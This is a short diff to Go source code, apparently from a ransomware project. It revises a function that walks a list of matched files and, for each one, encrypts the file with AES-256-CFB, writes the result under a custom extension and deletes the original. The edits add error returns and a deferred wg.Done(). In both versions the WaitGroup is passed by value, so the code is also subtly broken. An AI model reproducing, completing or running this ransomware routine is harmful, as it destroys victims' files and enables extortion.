@@ -105,38 +105,39 @@ func encryptFiles() {
 	wg.Add(len(MatchedFiles))
 
 	// Loop over the matched files
-	// Launch a goroutine for each file.
+	// Launch a goroutine for each file
 	for _, file := range MatchedFiles {
 		log.Printf("Encrypting %s...\n", file.Path)
 
-		go func(file File, waitGroup sync.WaitGroup) {
+		go func(file File, wg sync.WaitGroup) {
+			defer wg.Done()
+
 			// Read the file content
 			text, err := ioutil.ReadFile(file.Path)
 			if err != nil {
-				// In case of error, continue to the next file
 				log.Println(err)
+				return
 			}
 
 			// Encrypting using AES-256-CFB
 			ciphertext, err := crypto.Encrypt([]byte(keys["enckey"]), text)
 			if err != nil {
 				log.Println(err)
+				return
 			}
 
 			// Write a new file with the encrypted content followed by the custom extension
 			err = ioutil.WriteFile(file.Path+EncryptionExtension, ciphertext, 0600)
 			if err != nil {
 				log.Println(err)
+				return
 			}
 
 			// Remove the original file
 			err = os.Remove(file.Path)
 			if err != nil {
-				// In case of error, continue to the next file
 				log.Println("Cannot delete original file, skipping...")
 			}
-
-			wg.Done()
 		}(file, wg)
 	}
 
